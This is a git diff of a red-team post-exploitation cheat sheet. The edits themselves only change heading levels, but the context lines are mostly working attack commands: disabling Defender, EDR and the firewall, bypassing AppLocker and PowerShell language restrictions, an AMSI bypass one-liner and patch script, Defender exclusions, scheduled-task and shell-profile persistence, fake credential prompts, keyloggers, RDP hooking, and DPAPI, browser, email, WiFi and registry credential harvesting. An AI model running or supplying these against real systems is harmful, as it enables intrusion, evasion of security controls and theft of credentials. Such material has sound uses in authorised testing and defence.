@@ -2,21 +2,21 @@
 >Author: Pieter Miske
 ---
 ### __Get situational awareness:__
-##### _Enumerate session and user information:_
+#### _Enumerate session and user information:_
 - Get current user privileges:
 	- \([Seatbelt](https://github.com/GhostPack/Seatbelt)\): ```seatbelt.exe TokenGroups TokenPrivileges UAC UserRightAssignments```
 	- \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): ```whoami```
 - Enumerate the currently attached user sessions both local and over rdp (CS-Situational-Awareness-BOF): ```enumLocalSessions```
 - Enumerates all sessions on the specified computer or the local one (CS-Situational-Awareness-BOF): ```netsession (<IP or FQDN target system>)```
 - List local groups (CS-Situational-Awareness-BOF): ```netLocalGroupList```
-- List local group members (CS-Situational-Awareness-BOF): ```netLocalGroupListMembers```
+- List local group members (CS-Situational-Awareness-BOF): `netLocalGroupListMembers <group>`
 - Show titles from processes with active windows from current user \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Psw```
 - Accessible secrets based on local and domain privileges of current user \(Seatbelt\): ```seatbelt.exe KeePass CloudCredentials CredEnum CredGuard DpapiMasterKeys LAPS PuttyHostKeys RDCManFiles PuttySessions SecPackageCreds SuperPutty FileZilla WindowsAutoLogon WindowsCredentialFiles WindowsVault```
 - User session info \(Seatbelt\): ```seatbelt.exe RDPSavedConnections RDPSessions LogonEvents LogonSessions```
 - Recently used/modified/deleted files \(Seatbelt\): ```seatbelt.exe ExplorerMRUs OfficeMRUs RecycleBin OutlookDownloads```
 - General user info \(Seatbelt\): ```seatbelt.exe -group=user```
 
-##### _Enumerate general system and network information:_
+#### _Enumerate general system and network information:_
 - Show detailed information from all processes running on the system and provides a summary of installed security products and tools \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Psx```
 - Get a list of running processes including PID, PPID and ComandLine (uses wmi) \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): ```tasklist```
 - Prints process environment variables (CS-Situational-Awareness-BOF): ```env```
@@ -32,7 +32,7 @@
 - Makes a dns query (CS-Situational-Awareness-BOF): ```nslookup <FQDN system>```
 - Network and share info \(Seatbelt\): ```seatbelt.exe DNSCache NetworkProfiles NetworkShares TcpConnections```
 
-##### _Enumerate defensive measures:_
+#### _Enumerate defensive measures:_
 - List installed security products and tools (also lists processes) \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Psx```
 - List process DLL's (default current) to determine if the process was injected by EDR/AV: \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): ```listmods (<pid>)```
 - Enumerate installed services to check the signing cert against known EDR/AV vendors (CS-Situational-Awareness-BOF): ```driversigs```
@@ -49,7 +49,7 @@
 
 ---
 ### __Bypass defenses:__
-##### _Disable EDR/AV solution:_
+#### _Disable EDR/AV solution:_
 >These methods require elevated privileges. 
 - Make Defender useless by leveraging [Backstab](https://github.com/Yaxser/Backstab) and [KillDefender](https://github.com/Octoberfest7/KillDefender_BOF) as BOF: 
 	- Check the integrity level of a process ([KDStab](https://github.com/Octoberfest7/KDStab)\): ```kdstab /NAME:<MsMpEng.exe> /CHECK```
@@ -63,14 +63,14 @@
 - Refresh DLL's and remove their hooks for CS \([unhook\-bof](https://github.com/rsmudge/unhook-bof)\): ```unhook```
 - Disable Windows Defender via PowerShell: ```Set-MpPreference -DisableRealtimeMonitoring $true```
 
-##### _Disable/enable firewall:_
+#### _Disable/enable firewall:_
 >These methods require elevated privileges. 
 - Check status firewall (can be run from low-priv user context) \([Firewall\_Enumerator\_BOF](https://github.com/EspressoCake/Firewall_Walker_BOF)\): ```fw_walk status```
 - Disable firewall \(Firewall\_Enumerator\_BOF\): ```fw_walk disable```
 - Enable firewall \(Firewall\_Enumerator\_BOF\): ```fw_walk enable```
 - Disable firewall: ```netsh Advfirewall set allprofiles state off```
 
-##### _Bypassing Applocker:_
+#### _Bypassing Applocker:_
 AppLocker is Microsoft's application whitelisting technology that can restrict the executables, libraries and scripts that are permitted to run on a system\. AppLocker rules are split into 5 categories \- Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement \(enforced, audit only, none\)\. If an AppLocker category is "enforced", then by default everything within that category is blocked\. Rules can then be added to allow principals to execute files within that category based on a set of criteria.
 >Trying to execute anything that is blocked by AppLocker looks like this: "This program is blocked by group policy\. For more information, contact your system administrator\."
 
@@ -89,7 +89,7 @@ AppLocker is Microsoft's application whitelisting technology that can restrict t
 - Become Local Admin: by default, AppLocker is not applied to Administrators\.
 - Executing untrusted code via LOLBAS's: leverage trusted Windows executables from the [LOLBAS](https://lolbas-project.github.io/) project that can run your code and bypass any applocker rules \(check the "Payload" section for inspiration)\.
 
-##### _Bypass PowerShell Constrained Language Mode \(CLM\):_
+#### _Bypass PowerShell Constrained Language Mode \(CLM\):_
 When AppLocker is enabled PowerShell is placed into Constrained Language Mode \(CLM\), which restricts it to core types\. CLM can also be enabled locally without AppLocker being enabled\. 
 >Disabling CLM may require you to start a new PS session afterwards.
 - Powershell automation for C\#: leverage the powershell automation dll in your C\# code to bypass CLM \(check the "Payload" section for inspiration\)
@@ -99,7 +99,7 @@ When AppLocker is enabled PowerShell is placed into Constrained Language Mode \(
 	- 2\. Execute PowerShdll\.dll \(maybe press enter few times\): ```rundll32 .\PowerShdll.dll,main -i```
 - Local configured CLM \(requires admin privileges\): this type of CLM can be bypassed by editing the global environment variable named "\_\_PSLockdownPolicy"\. When its value is equal to 8, PowerShell operates in Full Language Mode: ```setx __PSLockdownPolicy "0" /M```
 
-##### _AMSI bypass:_
+#### _AMSI bypass:_
 - Corrupt AmsiOpenSession: PS one\-liner that overwrites the context structure header and corrupts it and forces AmsiOpenSession to error out: ```$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)```
 - Patch AMSI: save as script\.ps1 and run in PS session to bypass AMSI:
     ```PS
@@ -130,17 +130,17 @@ When AppLocker is enabled PowerShell is placed into Constrained Language Mode \(
     $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
     ```
 
-##### _Exclusions:_
+#### _Exclusions:_
 Most antivirus solutions allow you to define exclusions to on\-demand and real\-time scanning\. Windows Defender allows admins to add exclusions via GPO, or locally on a single machine.
 - List the current exclusions \(can be handy to run via agentless technique on remote target\): ```Get-MpPreference | select Exclusion*```
 - Add your own exclusion: ```Set-MpPreference -ExclusionPath "<path>"```
 
-##### _Smartscreen:_
+#### _Smartscreen:_
 If Smartscreen is enabled and your payload.exe is not signed, don't download your hosted executable directly from a webserver. Smartscreen will "mark" the payload and make it impossible to execute without GUI access and/or high privileges. 
 
 ---
 ### __Get persistent access:__
-##### _Windows persistent access techniques:_
+#### _Windows persistent access techniques:_
 >The following commands are examples and must be modified to your needs\. For the SharpPersist tool it is recommended to first run the "\-m list" \(to list all present entries for the specified persistence technique\) and the "\-m check" argument \(verifies if specified persistence technique will work\) before executing the actual persistence command\. 
 - New Scheduled Task \(userland persistence & NT AUTHORITY\SYSTEM). This persistence technique will create a new scheduled task in the context of the current user/SYSTEM privileges (for a SYSTEM task, first elevate to NT AUTHORITY\SYSTEM\). By default the task is set as a "daily" task but can be changed to "hourly" or "logon" \(logon requires admin privs\):
     - \([SharpPersist](https://github.com/fireeye/SharPersist/wiki)\): ```SharPersist.exe -t schtask -c "<payload.exe to execute>" (-a "<additional arguments>") -n "<new scheduled task name>" -m add (-o logon)```
@@ -154,7 +154,7 @@ If Smartscreen is enabled and your payload.exe is not signed, don't download you
     - 2\. From the already owned user account, import the 'RemoteHashRetrieval\.ps1' file and execute the following command to obtain the target machine hash \(DAMP\): ```Get-RemoteMachineAccountHash -ComputerName <FQDN target computer> -Verbose```
     - 3\. Forge a silver ticket to gain access to the target system\. 
 
-##### _Unix persistent access techniques:_
+#### _Unix persistent access techniques:_
 
 - Setup persistence via user config files:
     - 1\. In the current user's home directory, select either the '\.bash\_profile' file \(executed when initially logging in to the system\) or the '\.bashrc' file \(executed when a new terminal window is opened\) for modification\.
@@ -173,19 +173,19 @@ If Smartscreen is enabled and your payload.exe is not signed, don't download you
 ---
 ### __Obtain secrets via user interaction:__
 
-##### _Run credential pop\-up:_ 
+#### _Run credential pop\-up:_ 
 - Customizable Windows authentication prompt that can verify if the entered credentials are valid on the local system or in the domain \([AskNicely](https://github.com/pietermiske/AskNicely)\): ```AskNicely.exe (/verify) (/title:"<Custom title>" /message:"<Custom message>")```
 - Simple popup using BOF that isn’t persistent or checks if creds are valid \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Askcreds (<optional text as window title>)```
 
-##### Keylogger:
+#### Keylogger:
 - PoshC2: Gives nice output and writes in file \(process can't be terminated\): ```start-keystrokes-writefile```
 - Cobalt Strike: Inject a keylogger into a given process \(kill with jobkill <ID>\) (OPSEC: this is using fork&run): ```keylogger (<PID>) (<x86|x64>)```
 
-##### Screenshots:
+#### Screenshots:
 - PoshC2: \(screenshots are saved in: /var/poshc2/<project>/downloads/\): ```get-screenshot```
 - Cobalt Strike: Inject in given process and take screenshot: ```screenshot (<PID>) (<x86|x64>) (<runtime in seconds>)```
 
-##### RDP API Hooking: 
+#### RDP API Hooking: 
 RDP Credentials can be captured by intercepting function calls \(API Hooking\) in mstsc\.exe, the native windows binary that creates connections to Remote Desktop Services\. This tool will look for new instances of mstsc\.exe, inject the RemoteViewing shellcode and save the encrypted credentials into a file\. *
 >This technique doesn’t require elevated privileges\. 
 - 1\. Download and compile both the [RemoteViewing](https://github.com/FuzzySecurity/Sharp-Suite/tree/master/RemoteViewing) and Clairvoyant tool \(don’t forget to restore the NuGet packages if required\)
@@ -285,7 +285,7 @@ RDP Credentials can be captured by intercepting function calls \(API Hooking\) i
 
 ---
 ### __Search for stored secrets on the system:__
-##### _Credential Manager password harvesting \(DPAPI\):_
+#### _Credential Manager password harvesting \(DPAPI\):_
 - Targeting current user account \(doesn't require elevated privs\):
 	- 1\. Check if there are blobs present on disk: ```ls C:\Users\<username>\AppData\Local\Microsoft\Credentials (-Force)```
 	- 2\. \(optional\) Check what they are used for \(e\.g target=TERMSRV means RDP\): ```vaultcmd /listcreds:"Windows Credentials" /all```
@@ -301,7 +301,7 @@ RDP Credentials can be captured by intercepting function calls \(API Hooking\) i
 		- 1\. Retrieve the domain controller's DPAPI backup key which can be used to decrypt master key blobs for any user in the domain \(the key never changes\) \(SharpDPAPI\): ```SharpDPAPI backupkey (/server:<FQDN DC>) /file:C:\<path to>\key.pvk```
 		- 2\. Using a domain DPAPI backup key to first decrypt any discoverable masterkeys and then search for Credential files and decrypt them \(SharpDPAPI\): ```SharpDPAPI credentials /pvk:C:\<path to>\key.pvk```
 
-##### _Browser login and cookie harvesting \(DPAPI\):_
+#### _Browser login and cookie harvesting \(DPAPI\):_
 >Some websites have set restriction on the reuse of cookies like: single cookie use; restricted by IP, device or some sort of fingerprint\. Therefore, it is not always possible to leverage an obtained cookie.
 - Targeting current user account \(doesn't require elevated privs\):
 	- Stored Credentials:
@@ -317,13 +317,13 @@ RDP Credentials can be captured by intercepting function calls \(API Hooking\) i
 	- 1\. Retrieve the domain controller's DPAPI backup key \([SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)\): ```SharpDPAPI backupkey (/server:<FQDN DC>) /file:C:\<path to>\key.pvk```
 	- 2\. Using a domain DPAPI backup key to first decrypt any discoverable masterkeys and then search for Vaults and decrypt them \(SharpDPAPI\): ```SharpDPAPI vaults /pvk:C:\<path to>\key.pvk```
 
-##### _Mozilla Thunderbird email & credential dumping:_
+#### _Mozilla Thunderbird email & credential dumping:_
 - Retrieve saved credentials from Thunderbird \([Thunderfox](https://github.com/V1V1/SharpScribbles)\): ```.\Thunderfox.exe creds (/target:"C:\Users\<username>\AppData\Roaming\Thunderbird\Profiles\<string>.default-release")```
 - Retrieve a list of the user's Thunderbird contacts \(Thunderfox\): ```.\Thunderfox.exe contacts```
 - Retrieve a detailed list of all emails in Thunderbird \(Thunderfox\): ```.\Thunderfox.exe listmail```
 - Read a specific email \(Thunderfox\): ```.\Thunderfox.exe readmail /id:<email ID>```
 
-##### _Outlook e\-mail export:_
+#### _Outlook e\-mail export:_
 In Outlook there are PST and OST files\. PST is used to store file locally whereas OST is an Offline storage used when no server connection is present\.
 - 1\. Check the following location for PST or OST mail files:
 	```
@@ -333,18 +333,18 @@ In Outlook there are PST and OST files\. PST is used to store file locally where
 - 2\. Kill the outlook process and download all the files
 - 3\. To view the content of the files import them in a compatable email client \(free OST viewer application\)
 
-##### _Dump stored WiFi passwords:_
+#### _Dump stored WiFi passwords:_
 This technique dumps all stored WiFi passwords on the system and can be run without admin privileges\. 
 - [Get-WLANPass.ps1](https://github.com/zenosxx/PoshC2/blob/master/Modules/Get-WLANPass.ps1): ```get-wlanpass```
 - Native PowerShell:
 	- 1\. Show all stored wireless AP names: ```netsh wlan show profile```
 	- 2\. Select a AP name copy/paste it in the following command and dump the associated stored password: ```netsh wlan show profile <AP name> key=clear | Select-String -Pattern "Key Content"```
 
-##### _Search registry for passwords:_
+#### _Search registry for passwords:_
 - 1\. Remotely dump HKEY\_USERS registry \([impacket](https://github.com/SecureAuthCorp/impacket)\): ```reg.py <domain>/<usename>@<target ip or FQDN> (-hashes :<NTLM>) query -keyName HKU -s |tee hku.reg```
 - 2\. Search for stored cleartest passwords \(recommended to search for keywords like "password" or software names\): ```grep "<keyword>" hku.reg (-A3 -B3) -a```
 
-##### _General search queries and tools:_
+#### _General search queries and tools:_
 - Fast file searching and specific keyword identification \(use the '\-c' option to search file contents\) \([SauronEye](https://github.com/vivami/SauronEye)\): ```SauronEye.exe -d C:\<directories to search> -f <filetypes to search for/in (.txt .doc .docx .xls)> (-c) (-k <Keywords to search for (e.g. pass*)>)```
 - Recursive file search via PowerShell: ```gci -recurse -include <file name to search for>```
 - Recursively list all files in the current directory \(e.g. run from the users home directory\): ```cmd /c dir /S /A```
@@ -352,7 +352,7 @@ This technique dumps all stored WiFi passwords on the system and can be run with
 - Search everything that contains the word "password": ```findstr /spin "password" *.*```
 - Show hidden files: ```dir -Force```
 
-##### _Files that may contain credentials:_
+#### _Files that may contain credentials:_
 - Unattend files: ```unattend.xml```
 - Web config files: ```web.config```
 - System Preparation files \(also search for sysprep\.inf\): ```sysprep.xml```
